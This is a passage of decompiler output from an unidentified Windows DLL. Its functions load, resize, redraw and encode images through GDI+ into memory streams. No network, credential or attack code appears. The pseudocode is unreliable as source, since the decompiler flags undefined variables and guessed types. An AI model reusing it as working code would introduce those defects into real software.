    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x11);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x12);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x13);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x14);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
    sub_1003F846(v5, v24, v4, (_DWORD *)0x16);
    LOBYTE(v25) = 2;
    sub_1000B3DF(v24);
  }
  v25 = -1;
  sub_1000B3DF(v23);
}
// 1003F4B3: using guessed type int var_24[6];

//----- (1003F846) --------------------------------------------------------
_DWORD *__thiscall sub_1003F846(int *this, _DWORD *a2, int *a3, _DWORD *a4)
{
  void *v5; // ebx
  int v6; // eax
  LONG *v7; // eax
  int v8; // eax
  _DWORD v10[9]; // [esp-14h] [ebp-34h] BYREF
  int v11; // [esp+10h] [ebp-10h]
  int v12; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  sub_1000B1F3(0, (int)a2, 0);
  v12 = 0;
  v5 = a4;
  v6 = *this;
  v11 = 1;
  if ( (*(unsigned __int8 (__thiscall **)(int *, _DWORD **))(v6 + 8))(this, &a4) )
  {
    v7 = (LONG *)(*(int (__thiscall **)(int *, _DWORD **))(*this + 16))(this, &a4);
    sub_1000B3BD(v7, (int)a2);
    (*(void (__thiscall **)(int *, void *))(*a3 + 60))(a3, v5);
    a4 = v10;
    sub_1000B36F(a2, (int)v10);
    v12 = 1;
    v8 = *a3;
    LOBYTE(v12) = 0;
    (*(void (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v8 + 80))(
      a3,
      v10[0],
      v10[1],
      v10[2],
      v10[3],
      v10[4]);
  }
  return a2;
}

//----- (1003F8D0) --------------------------------------------------------
char sub_1003F8D0()
{
  return 53;
}

//----- (1003F8DB) --------------------------------------------------------
int __usercall sub_1003F8DB@<eax>(int a1@<esi>)
{
  int ImageWidth; // eax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = 0;
  ImageWidth = GdipGetImageWidth(*(_DWORD *)(a1 + 4), &v3);
  if ( ImageWidth )
    *(_DWORD *)(a1 + 8) = ImageWidth;
  return v3;
}
// 1009E835: using guessed type int __stdcall GdipGetImageWidth(_DWORD, _DWORD);

//----- (1003F8FB) --------------------------------------------------------
int __usercall sub_1003F8FB@<eax>(int a1@<esi>)
{
  int ImageHeight; // eax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = 0;
  ImageHeight = GdipGetImageHeight(*(_DWORD *)(a1 + 4), &v3);
  if ( ImageHeight )
    *(_DWORD *)(a1 + 8) = ImageHeight;
  return v3;
}
// 1009E825: using guessed type int __stdcall GdipGetImageHeight(_DWORD, _DWORD);

//----- (1003F91B) --------------------------------------------------------
_DWORD *__stdcall sub_1003F91B(_DWORD *a1, int a2)
{
  int v3[4]; // [esp+10h] [ebp-10h] BYREF

  *a1 = &off_10103C98;
  v3[3] = 0;
  v3[0] = 0;
  *a1 = &off_10103F20;
  a1[2] = GdipCreateBitmapFromFile(a2, v3);
  a1[1] = v3[0];
  return a1;
}
// 1009E845: using guessed type int __stdcall GdipCreateBitmapFromFile(_DWORD, _DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);
// 10103F20: using guessed type int (__stdcall *off_10103F20)(char);

//----- (1003F961) --------------------------------------------------------
_DWORD *__thiscall sub_1003F961(_DWORD *this, char a2)
{
  int v4; // [esp-4h] [ebp-24h]

  v4 = this[1];
  *this = &off_10103C98;
  GdipDisposeImage(v4);
  if ( (a2 & 1) != 0 )
    GdipFree(this);
  return this;
}
// 1009E745: using guessed type int __stdcall GdipFree(_DWORD);
// 1009E785: using guessed type int __stdcall GdipDisposeImage(_DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);

//----- (1003F99A) --------------------------------------------------------
_DWORD *__stdcall sub_1003F99A(_DWORD *a1, int a2)
{
  int v3[4]; // [esp+10h] [ebp-10h] BYREF

  *a1 = &off_10103C98;
  v3[3] = 0;
  v3[0] = 0;
  *a1 = &off_10103F20;
  a1[2] = GdipCreateBitmapFromStream(a2, v3);
  a1[1] = v3[0];
  return a1;
}
// 1009E7D5: using guessed type int __stdcall GdipCreateBitmapFromStream(_DWORD, _DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);
// 10103F20: using guessed type int (__stdcall *off_10103F20)(char);

//----- (1003F9E0) --------------------------------------------------------
_DWORD *__stdcall sub_1003F9E0(_DWORD *a1, int a2, int a3)
{
  int v4[4]; // [esp+10h] [ebp-10h] BYREF

  *a1 = &off_10103C98;
  v4[3] = 0;
  *a1 = &off_10103F20;
  v4[0] = 0;
  a1[2] = GdipCreateBitmapFromScan0(a2, a3, 0, 2498570, 0, v4);
  a1[1] = v4[0];
  return a1;
}
// 1009E7B5: using guessed type int __stdcall GdipCreateBitmapFromScan0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10103C98: using guessed type int (__stdcall *off_10103C98)(char);
// 10103F20: using guessed type int (__stdcall *off_10103F20)(char);

//----- (1003FA30) --------------------------------------------------------
_DWORD *__fastcall sub_1003FA30(void *a1, int a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  int v6[3]; // [esp+10h] [ebp-10h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  *a3 = off_1010343C;
  sub_1004046F(a3 + 1);
  v7 = 1;
  sub_1000B1F3(a1, (int)(a3 + 3), 0);
  if ( (unsigned int)a1 < 0x10 )
  {
    v4 = sub_1000E7F7(v6, 1, 0);
    LOBYTE(v7) = 2;
    sub_10007882((int)v4);
  }
  return a3;
}
// 1010343C: using guessed type int (__thiscall *off_1010343C[2])(void *Block, char);
// 1003FA30: using guessed type int var_10[3];

//----- (1003FA8C) --------------------------------------------------------
void *__stdcall sub_1003FA8C(IStream *a1, void *a2, _DWORD *a3, size_t a4, unsigned int a5, char a6, int a7)
{
  unsigned int v8; // edi
  int v9; // eax
  int v11; // [esp-14h] [ebp-4Ch]
  int *v12; // [esp-10h] [ebp-48h]
  int v13; // [esp+18h] [ebp-20h] BYREF
  volatile LONG *v14; // [esp+1Ch] [ebp-1Ch]
  int v15; // [esp+24h] [ebp-14h]
  int v16; // [esp+34h] [ebp-4h]

  v15 = 0;
  v16 = 1;
  sub_1003FB72(&v13, a3);
  LOBYTE(v16) = 2;
  if ( a6 )
  {
    v8 = sub_1003F8DB(v13);
    v9 = sub_1003F8FB(v13);
    a5 = v9;
    if ( v8 )
      a5 = a4 * v9 / v8;
  }
  v12 = (int *)v14;
  v11 = v13;
  InterlockedIncrement(v14);
  LOBYTE(v16) = 2;
  sub_1003FD3E(a1, a2, (int)a3, v11, v12, a4, (size_t *)a5, a7);
  v15 = 1;
  LOBYTE(v16) = 1;
  sub_10044C74(&v13);
  return a2;
}

//----- (1003FB72) --------------------------------------------------------
int *__stdcall sub_1003FB72(int *a1, _DWORD *a2)
{
  bool v2; // zf
  _DWORD *v3; // eax
  int v4; // eax
  struct IStreamVtbl *lpVtbl; // edi
  int v6; // eax
  IStream *v7; // edx
  void *v8; // edi
  int v9; // esi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  _DWORD *v13; // eax
  DWORD LastError; // edi
  __int32 v16; // eax
  int v17; // ecx
  int v18; // [esp-8h] [ebp-48h] BYREF
  int v19; // [esp-4h] [ebp-44h]
  int v20; // [esp+10h] [ebp-30h] BYREF
  int v21; // [esp+14h] [ebp-2Ch] BYREF
  void *v22; // [esp+18h] [ebp-28h]
  int v23; // [esp+1Ch] [ebp-24h] BYREF
  int v24; // [esp+20h] [ebp-20h]
  void *v25; // [esp+24h] [ebp-1Ch]
  int v26; // [esp+28h] [ebp-18h]
  int v27; // [esp+2Ch] [ebp-14h] BYREF
  LPSTREAM ppstm[3]; // [esp+30h] [ebp-10h] BYREF
  int v29; // [esp+3Ch] [ebp-4h]

  v26 = 0;
  sub_10039112(a1, 0);
  v29 = 0;
  v2 = a2[6] == 0;
  v26 = 1;
  if ( v2 )
  {
    v12 = (_DWORD *)GdipAlloc(16);
    v25 = v12;
    v29 = 7;
    if ( v12 )
      v13 = sub_1003F91B(v12, *(_DWORD *)(a2[1] + 12));
    else
      v13 = 0;
    LOBYTE(v29) = 0;
    sub_100403B9(a1, (int)v13);
  }
  else
  {
    ppstm[0] = 0;
    v29 = 2;
    if ( CreateStreamOnHGlobal(0, 1, ppstm) )
    {
      v3 = sub_1000E9DF(&v23, 1, 1);
      LOBYTE(v29) = 3;
      v19 = 74;
      goto LABEL_4;
    }
    v21 = 0;
    v22 = 0;
    v24 = 0;
    v25 = 0;
    v4 = a2[6];
    v19 = (int)&v27;
    v27 = 0;
    lpVtbl = ppstm[0]->lpVtbl;
    v18 = v4;
    v6 = sub_1000B4B8(a2 + 3);
    if ( lpVtbl->Write(v7, (const void *)v6, v18, (ULONG *)&v27) || v27 != a2[6] )
    {
      v3 = sub_1000E9DF(&v23, 1, 1);
      LOBYTE(v29) = 4;
      v19 = 87;
      goto LABEL_4;
    }
    v8 = v25;
    v9 = v24;
    if ( ((int (__stdcall *)(LPSTREAM, int, void *, _DWORD, int *))ppstm[0]->lpVtbl->Seek)(ppstm[0], v24, v25, 0, &v21)
      || v9 != v21
      || v8 != v22 )
    {
      v3 = sub_1000E9DF(&v23, 1, 1);
      LOBYTE(v29) = 5;
      v19 = 95;
      goto LABEL_4;
    }
    v10 = (_DWORD *)GdipAlloc(16);
    v25 = v10;
    LOBYTE(v29) = 6;
    if ( v10 )
      v11 = sub_1003F99A(v10, (int)ppstm[0]);
    else
      v11 = 0;
    LOBYTE(v29) = 2;
    sub_100403B9(a1, (int)v11);
    LOBYTE(v29) = 0;
    sub_1004745B((int *)ppstm);
  }
  LastError = GetLastError();
  if ( !sub_1003F8DB(*a1) || LastError )
  {
    SetLastError(LastError);
    sub_10029BC2(v16);
    v19 = v17;
    v18 = v17;
    v25 = &v18;
    sub_1000728E(&v18, 0);
    v29 = 0;
    sub_1004F292((_DWORD *)dword_10182DE8, 119, (int)a2, v18, v19);
    v3 = sub_1000E9DF(&v20, 1, 1);
    v29 = 9;
    v19 = 118;
LABEL_4:
    sub_1000A947(v3, v19);
  }
  return a1;
}
// 1003FBFE: variable 'v7' is possibly undefined
// 1003FCF8: variable 'v16' is possibly undefined
// 1003FCFD: variable 'v17' is possibly undefined
// 1009E755: using guessed type int __stdcall GdipAlloc(_DWORD);
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1003FD3E) --------------------------------------------------------
void *__stdcall sub_1003FD3E(IStream *a1, void *a2, int a3, int a4, int *a5, size_t a6, size_t *a7, int a8)
{
  int v8; // esi
  unsigned int v9; // edi
  size_t *v10; // eax
  int *v11; // eax
  DWORD LastError; // eax
  int v13; // ecx
  __int32 v14; // eax
  int v15; // ecx
  void *v16; // eax
  int *v17; // ecx
  int v19; // [esp-10h] [ebp-54h] BYREF
  int *p_Src; // [esp-Ch] [ebp-50h] BYREF
  size_t v21; // [esp-8h] [ebp-4Ch] BYREF
  size_t *v22; // [esp-4h] [ebp-48h]
  int Src; // [esp+10h] [ebp-34h] BYREF
  int v24; // [esp+14h] [ebp-30h] BYREF
  int v25; // [esp+18h] [ebp-2Ch]
  DWORD v26; // [esp+1Ch] [ebp-28h]
  int v27; // [esp+20h] [ebp-24h] BYREF
  int *v28; // [esp+28h] [ebp-1Ch] BYREF
  volatile LONG *v29; // [esp+2Ch] [ebp-18h]
  int v30; // [esp+30h] [ebp-14h]
  int v31; // [esp+40h] [ebp-4h]

  v30 = 0;
  v31 = 1;
  v24 = 0;
  v25 = 0;
  v26 = 0;
  Src = *(_DWORD *)(a3 + 8);
  v8 = a4;
  v9 = sub_1003F8DB(a4);
  v10 = (size_t *)sub_1003F8FB(v8);
  if ( v9 < a6 )
    a6 = v9;
  if ( v10 < a7 )
    a7 = v10;
  if ( !a6 )
    a6 = v9;
  if ( !a7 )
    a7 = v10;
  LOBYTE(v31) = 2;
  v22 = a7;
  v21 = a6;
  a7 = (size_t *)&v19;
  p_Src = a5;
  v19 = v8;
  InterlockedIncrement(a5);
  LOBYTE(v31) = 2;
  sub_1003FF49((int *)&v28, v19, (int)p_Src, v21, (int)v22);
  LOBYTE(v31) = 4;
  sub_10029BB6((__int32)&a7 + 3, (int)&a7 + 3);
  if ( a1[6].lpVtbl < (struct IStreamVtbl *)8 )
  {
    v27 = 5;
    LastError = GetLastError();
    v25 = 5;
    v26 = LastError;
    v22 = (size_t *)v13;
    v21 = v13;
    a7 = &v21;
    sub_1000728E(&v21, 0);
    LOBYTE(v31) = 7;
    goto LABEL_13;
  }
  v22 = (size_t *)a8;
  a7 = (size_t *)&p_Src;
  v21 = (size_t)v29;
  p_Src = v28;
  InterlockedIncrement(v29);
  LOBYTE(v31) = 4;
  v11 = sub_1004001F(8u, &v24, a1, &v27, (int)p_Src, v21, (char)v22);
  v25 = *v11;
  v26 = v11[1];
  if ( v25 == 5 )
  {
    v22 = (size_t *)5;
    v21 = 5;
    a7 = &v21;
    sub_1000728E(&v21, 0);
    LOBYTE(v31) = 6;
LABEL_13:
    LOBYTE(v31) = 4;
    sub_1004F292((_DWORD *)dword_10182DE8, 16, a3, v21, (int)v22);
  }
  LOBYTE(v31) = 2;
  sub_10044C74(&v28);
  v31 = 1;
  if ( v25 || !v24 )
  {
    v24 = 0;
    if ( v25 != 5 )
    {
      sub_10029BC2(v14);
      v21 = (size_t)v17;
      p_Src = v17;
      a7 = (size_t *)&p_Src;
      sub_1000728E(&p_Src, 0);
      LOBYTE(v31) = 1;
      sub_1004F292((_DWORD *)dword_10182DE8, 14, a3, (int)p_Src, v21);
    }
    sub_1000B1F3((void *)0x10, (int)a2, &Src);
  }
  else
  {
    v21 = 8;
    p_Src = &Src;
    v16 = (void *)sub_1000B49B(&a1[3].lpVtbl, v15);
    memcpy(v16, p_Src, v21);
    LOBYTE(a1[4].lpVtbl->Release) = 1;
    sub_1000B6B7(&a1[3].lpVtbl, (int)a2, 0, v24 + 8);
  }
  v30 = 1;
  LOBYTE(v31) = 0;
  sub_10044C74(&a4);
  return a2;
}
// 1003FE53: variable 'v13' is possibly undefined
// 1003FEC0: variable 'v15' is possibly undefined
// 1003FEF2: variable 'v14' is possibly undefined
// 1003FEF7: variable 'v17' is possibly undefined
// 10182DE8: using guessed type int dword_10182DE8;

//----- (1003FF49) --------------------------------------------------------
int *__stdcall sub_1003FF49(int *a1, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  bool v8; // zf
  int v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  int v13[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD *v14; // [esp+1Ch] [ebp-1Ch]
  int ImageGraphicsContext; // [esp+20h] [ebp-18h]
  int v16; // [esp+24h] [ebp-14h]
  int v17[3]; // [esp+28h] [ebp-10h] BYREF
  int v18; // [esp+34h] [ebp-4h]

  v16 = 0;
  v18 = 2;
  v5 = (_DWORD *)GdipAlloc(16);
  v17[0] = (int)v5;
  if ( v5 )
    v6 = sub_1003F9E0(v5, a4, a5);
  else
    v6 = 0;
  LOBYTE(v18) = 1;
  sub_10039112(a1, (int)v6);
  v7 = *a1;
  v8 = *a1 == 0;
  v16 = 1;
  v17[0] = 0;
  if ( !v8 )
    ImageGraphicsContext = GdipGetImageGraphicsContext(*(_DWORD *)(v7 + 4), v17);
  v14 = (_DWORD *)v17[0];
  LOBYTE(v18) = 3;
  if ( a2 )
    v9 = *(_DWORD *)(a2 + 4);
  else
    v9 = 0;
  v10 = GdipDrawImageRectI(v14, v9, 0, 0, a4, a5);
  if ( v10 )
    ImageGraphicsContext = v10;
  else
    v10 = 0;
  if ( v10 )
  {
    v11 = sub_1000E9DF(v13, 1, 1);
    LOBYTE(v18) = 4;
    sub_1000A947(v11, 194);
  }
  LOBYTE(v18) = 1;
  GdipDeleteGraphics(v14);
  LOBYTE(v18) = 0;
  sub_10044C74(&a2);
  return a1;
}
// 1009E755: using guessed type int __stdcall GdipAlloc(_DWORD);
// 1009E7C5: using guessed type int __stdcall GdipDeleteGraphics(_DWORD);
// 1009E7F5: using guessed type int __stdcall GdipGetImageGraphicsContext(_DWORD, _DWORD);
// 1009E815: using guessed type int __stdcall GdipDrawImageRectI(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1003FF49: using guessed type int var_10[3];
// 1003FF49: using guessed type int var_28[3];

//----- (1004001F) --------------------------------------------------------
_DWORD *__fastcall sub_1004001F(unsigned int a1, _DWORD *a2, LPSTREAM a3, _DWORD *a4, int a5, int a6, char a7)
{
  _DWORD *v7; // eax
  int v9; // edi
  int v10; // eax
  int v11; // ecx
  int v12; // esi
  HRESULT (__stdcall **p_Read)(IStream *, void *, ULONG, ULONG *); // edi
  int v14; // eax
  int v15; // [esp-8h] [ebp-98h]
  char v16[76]; // [esp+10h] [ebp-80h] BYREF
  int v17[2]; // [esp+5Ch] [ebp-34h] BYREF
  int v18; // [esp+64h] [ebp-2Ch] BYREF
  _DWORD *v19; // [esp+68h] [ebp-28h] BYREF
  unsigned int v20; // [esp+6Ch] [ebp-24h]
  LPSTREAM v21; // [esp+70h] [ebp-20h]
  int v22; // [esp+74h] [ebp-1Ch]
  _DWORD *v23; // [esp+78h] [ebp-18h]
  LPSTREAM ppstm[2]; // [esp+7Ch] [ebp-14h] BYREF
  int v25; // [esp+8Ch] [ebp-4h]
  int v26[19]; // [esp+90h] [ebp+0h] BYREF
  int v27[8]; // [esp+DCh] [ebp+4Ch] BYREF

  v21 = a3;
  v23 = a4;
  v20 = a1;
  v19 = a2;
  v25 = 0;
  if ( (struct IStreamVtbl *)a1 > a3[6].lpVtbl )
  {
    v7 = sub_1000E7F7(&v19, 1, 0);
    LOBYTE(v25) = 1;
    sub_10007882((int)v7);
  }
  memset(v26, 0, sizeof(v26));
  LOBYTE(v25) = 2;
  qmemcpy(v26, sub_10040262(v16), sizeof(v26));
  v25 = 0;
  v27[0] = 1;
  v27[1] = dword_100FBEAC[0];
  v27[2] = dword_100FBEAC[1];
  v27[3] = dword_100FBEAC[2];
  v27[4] = dword_100FBEAC[3];
  v27[5] = 1;
  v27[6] = 4;
  v27[7] = (int)&a7;
  ppstm[0] = 0;
  LOBYTE(v25) = 5;
  if ( CreateStreamOnHGlobal(0, 1, ppstm) )
  {
    *a4 = 4;
  }
  else
  {
    v9 = a5;
    v10 = GdipSaveImageToStream(*(_DWORD *)(a5 + 4), ppstm[0], v26, v27);
    if ( v10 )
      *(_DWORD *)(v9 + 8) = v10;
    else
      v10 = 0;
    if ( v10 )
    {
      a4[1] = 0;
      if ( v10 == -2147286928 )
        *a4 = 5;
      else
        *a4 = 6;
      goto LABEL_6;
    }
    v17[0] = 0;
    v17[1] = 0;
    v22 = 0;
    v23 = 0;
    if ( ((int (__stdcall *)(LPSTREAM, _DWORD, _DWORD, int, int *))ppstm[0]->lpVtbl->Seek)(ppstm[0], 0, 0, 1, v17)
      || ((int (__stdcall *)(LPSTREAM, int, _DWORD *, _DWORD, _DWORD))ppstm[0]->lpVtbl->Seek)(ppstm[0], v22, v23, 0, 0) )
    {
      *a4 = 6;
      a4[1] = 0;
      goto LABEL_6;
    }
    v12 = (int)v21;
    if ( (struct IStreamVtbl *)v17[0] <= (struct IStreamVtbl *)((char *)v21[6].lpVtbl - v20) )
    {
      v18 = 0;
      v21 = ppstm[0];
      p_Read = &ppstm[0]->lpVtbl->Read;
      v15 = v17[0];
      v14 = sub_1000B49B((_DWORD *)(v12 + 12), v11);
      if ( !(*p_Read)(v21, (void *)(v20 + v14), v15, (ULONG *)&v18) )
      {
        *(_BYTE *)(*(_DWORD *)(v12 + 16) + 8) = 1;
        if ( v18 == v17[0] )
        {
          *v19 = v18;
          *a4 = 0;
          a4[1] = 0;
          goto LABEL_7;
        }
      }
      *a4 = 6;
    }
    else
    {
      *a4 = 5;
    }
  }
  a4[1] = 0;
LABEL_6:
  a4[1] = GetLastError();
LABEL_7:
  LOBYTE(v25) = 0;
  sub_1004745B((int *)ppstm);
  v25 = -1;
  sub_10044C74(&a5);
  return a4;
}
// 100401C6: variable 'v11' is possibly undefined
// 1009E7E5: using guessed type int __stdcall GdipSaveImageToStream(_DWORD, _DWORD, _DWORD, _DWORD);
// 100FBEAC: using guessed type _DWORD dword_100FBEAC[5];
// 1004001F: using guessed type char var_F0[76];

//----- (10040262) --------------------------------------------------------
char *__stdcall sub_10040262(char *a1)
{
  int v1; // esi
  _DWORD *v2; // eax
  char *v3; // ebx
  _DWORD *v4; // eax
  unsigned int v6; // [esp+14h] [ebp-28h] BYREF
  size_t Size; // [esp+18h] [ebp-24h] BYREF
  void *Block; // [esp+1Ch] [ebp-20h] BYREF
  int v9; // [esp+20h] [ebp-1Ch] BYREF
  void *v10[3]; // [esp+24h] [ebp-18h] BYREF
  int v11; // [esp+38h] [ebp-4h]

  v1 = 0;
  v6 = 0;
  Size = 0;
  if ( GdipGetImageEncodersSize(&v6, &Size) )
  {
    v2 = sub_1000E7F7(&Block, 1, 0);
    v11 = 0;
    goto LABEL_3;
  }
  v3 = (char *)operator new(Size);
  v4 = operator new(4u);
  Block = v4;
  v11 = 1;
  if ( v4 )
    *v4 = 1;
  else
    v4 = 0;
  v10[1] = v4;
  v10[0] = v3;
  v11 = 2;
  if ( GdipGetImageEncoders(v6, Size, v3) )
  {
    v2 = sub_1000E7F7(&v9, 1, 0);
    LOBYTE(v11) = 3;
    goto LABEL_3;
  }
  if ( !v6 )
  {
LABEL_13:
    v2 = sub_1000E7F7(&v9, 1, 0);
    LOBYTE(v11) = 4;
LABEL_3:
    sub_10007882((int)v2);
  }
  Block = v3 + 48;
  while ( wcscmp(*(const wchar_t **)Block, String2) )
  {
    Block = (char *)Block + 76;
    if ( ++v1 >= v6 )
      goto LABEL_13;
  }
  qmemcpy(a1, &v3[76 * v1], 0x4Cu);
  v11 = -1;
  sub_100403FE(v10);
  return a1;
}
// 1009E7A5: using guessed type int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD);
// 1009E805: using guessed type int __stdcall GdipGetImageEncodersSize(_DWORD, _DWORD);

//----- (100403B9) --------------------------------------------------------
_DWORD *__usercall sub_100403B9@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_10040447((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
  return a1;
}

//----- (100403FE) --------------------------------------------------------
void __thiscall sub_100403FE(void **this)
{
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    j__free(*this);
  }
}

//----- (10040447) --------------------------------------------------------
void __usercall sub_10040447(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1004046F) --------------------------------------------------------
_DWORD *__usercall sub_1004046F@<eax>(_DWORD *a1@<esi>)
{
  int v2[4]; // [esp+0h] [ebp-10h] BYREF

  memset(&v2[1], 0, 12);
  *a1 = off_10103F28;
  v2[0] = 1;
  sub_100404C0((int)a1, (int)v2);
  return a1;
}
// 10103F28: using guessed type int (__thiscall *off_10103F28[3])(void *Block, char);

//----- (100404A4) --------------------------------------------------------
_DWORD *__thiscall sub_100404A4(_DWORD *Block, char a2)
{
  sub_10040543(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100404C0) --------------------------------------------------------
int __stdcall sub_100404C0(int a1, int a2)
{
  int result; // eax
  const struct Concurrency::SchedulerPolicy *v3; // ecx
  char pExceptionObject[16]; // [esp+14h] [ebp-14h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  v5 = 0;
  result = GdiplusStartup(a1 + 4, a2, 0);
  if ( result )
  {
    v3 = (const struct Concurrency::SchedulerPolicy *)sub_1003592A(&a2);
    LOBYTE(v5) = 1;
    Concurrency::details::ThreadScheduler::ThreadScheduler(
      (Concurrency::details::ThreadScheduler *)pExceptionObject,
      v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVXjjRisoNecbwkvkq_BurqUpfqufhkrx_wvnem__);
  }
  return result;
}
// 1009E865: using guessed type int __stdcall GdiplusStartup(_DWORD, _DWORD, _DWORD);

//----- (10040543) --------------------------------------------------------
int __thiscall sub_10040543(_DWORD *this)
{
  int v2; // [esp-4h] [ebp-4h]

  v2 = this[1];
  *this = off_10103F28;
  return GdiplusShutdown(v2);
}
// 1009E855: using guessed type int __stdcall GdiplusShutdown(_DWORD);
// 10103F28: using guessed type int (__thiscall *off_10103F28[3])(void *Block, char);

//----- (10040583) --------------------------------------------------------
_DWORD *__thiscall sub_10040583(_DWORD *Block, char a2)
{
  sub_1004059F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004059F) --------------------------------------------------------
void __thiscall sub_1004059F(_DWORD *this)
{
  *this = off_10103F2C;
  sub_1008B14A();
}
// 10103F2C: using guessed type int (__thiscall *off_10103F2C[2])(void *Block, char);

//----- (100405CE) --------------------------------------------------------
int __fastcall sub_100405CE(int a1, int a2, _DWORD *a3)
{
  int v3; // esi
  unsigned int v4; // edi
  void *v5; // ebx
  _DWORD *v6; // edx
  int v7; // ecx
  int v8; // edi
  int v10[5]; // [esp+10h] [ebp-24h] BYREF
  int v11; // [esp+24h] [ebp-10h]
  int v12; // [esp+28h] [ebp-Ch]
  int Src[2]; // [esp+2Ch] [ebp-8h] BYREF

  v3 = *(_DWORD *)(a2 + 12);
  v4 = a3[3] - 4;
  v5 = (void *)(sub_1000B4B8(a3) + 4);
  v10[4] = 0;
  v11 = 0;
  v12 = sub_1000B4B8(v6);
  if ( v4 < 4
    || (Src[0] = -2069057649,
        memcpy(v5, Src, 4u),
        v10[0] = v12,
        v10[2] = v3,
        v10[1] = (int)v5 + 4,
        v10[3] = v4 - 4,
        sub_1008C829(v10, v10),
        v11 + 4 <= 0) )
  {
    v8 = 0;
  }
  else
  {
    v8 = v11 + 4;
  }
  sub_1000B713(v7, a3, 0, v8);
  return v8 + 4;
}
// 100405EF: variable 'v6' is possibly undefined
// 1004064F: variable 'v7' is possibly undefined

//----- (1004065E) --------------------------------------------------------
_DWORD *__stdcall sub_1004065E(_DWORD *a1, int a2, int a3, _DWORD *a4, char a5, _DWORD *a6, wchar_t *lpAddend)
{
  _DWORD *v8; // [esp+0h] [ebp-2Ch] BYREF
  wchar_t *v9; // [esp+4h] [ebp-28h]
  void *v10; // [esp+1Ch] [ebp-10h]
  int v11; // [esp+28h] [ebp-4h]

  v11 = 0;
  v10 = &v8;
  v9 = lpAddend;
  v8 = a6;
  InterlockedIncrement((volatile LONG *)lpAddend);
  LOBYTE(v11) = 0;
  sub_10035C6C((int)a1, a2, a3, a4, a5, (int)v8, (volatile LONG *)v9);
  LOBYTE(v11) = 2;
  v9 = &word_10175790;
  v8 = a1 + 188;
  *a1 = &off_10103F30;
  sub_1000D17D(v8, v9);
  v11 = -1;
  sub_1000780D(&a6);
  return a1;
}
// 10103F30: using guessed type int (__thiscall *off_10103F30)(void *Block, char);

//----- (100406D5) --------------------------------------------------------
void *__thiscall sub_100406D5(void *Block, char a2)
{
  sub_1002AC92((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100406F2) --------------------------------------------------------
void *__thiscall sub_100406F2(_DWORD *this, void *a2)
{
  char *v3; // eax
  _DWORD *v4; // edi
  int v5; // eax
  char *v6; // eax
  int v7; // ecx
  void *v8; // eax
  int v9; // esi
  int v11; // [esp-4h] [ebp-58h]
  int v12[5]; // [esp+10h] [ebp-44h] BYREF
  int v13; // [esp+24h] [ebp-30h] BYREF
  int v14; // [esp+28h] [ebp-2Ch] BYREF
  LONG v15; // [esp+2Ch] [ebp-28h] BYREF
  int v16; // [esp+30h] [ebp-24h]
  int v17; // [esp+34h] [ebp-20h]
  int v18; // [esp+38h] [ebp-1Ch]
  int v19; // [esp+3Ch] [ebp-18h] BYREF
  char *i; // [esp+40h] [ebp-14h]
  unsigned int v21; // [esp+44h] [ebp-10h]
  int v22; // [esp+50h] [ebp-4h]

  v18 = 0;
  v17 = (int)(this + 168);
  v3 = (char *)(2 * sub_1000D687((int)(this + 168)) + 10);
  if ( (unsigned int)v3 <= 0xF4240 )
  {
    v21 = 0;
    v4 = this + 182;
    for ( i = v3; v21 < (*(int (__thiscall **)(_DWORD *))(*v4 + 4))(this + 182); i = v6 )
    {
      v5 = (*(int (__thiscall **)(_DWORD *, unsigned int))(*v4 + 48))(this + 182, v21);
      v6 = &i[2 * sub_1000D687(v5 + 4) + 6];
      if ( (unsigned int)v6 >= 0xF4240 )
        break;
      ++v21;
    }
    sub_1000B1F3(i, (int)v12, 0);
    v22 = 1;
    sub_10008066(&v13);
    LOBYTE(v22) = 2;
    v8 = (void *)sub_1000B49B(v12, v7);
    memcpy(v8, this + 178, 4u);
    *(_BYTE *)(v12[1] + 8) = 1;
    v11 = this[179];
    v19 = 4;
    sub_10040853(v12, &v19, v17, v11);
    for ( i = 0; (unsigned int)i < v21; ++i )
    {
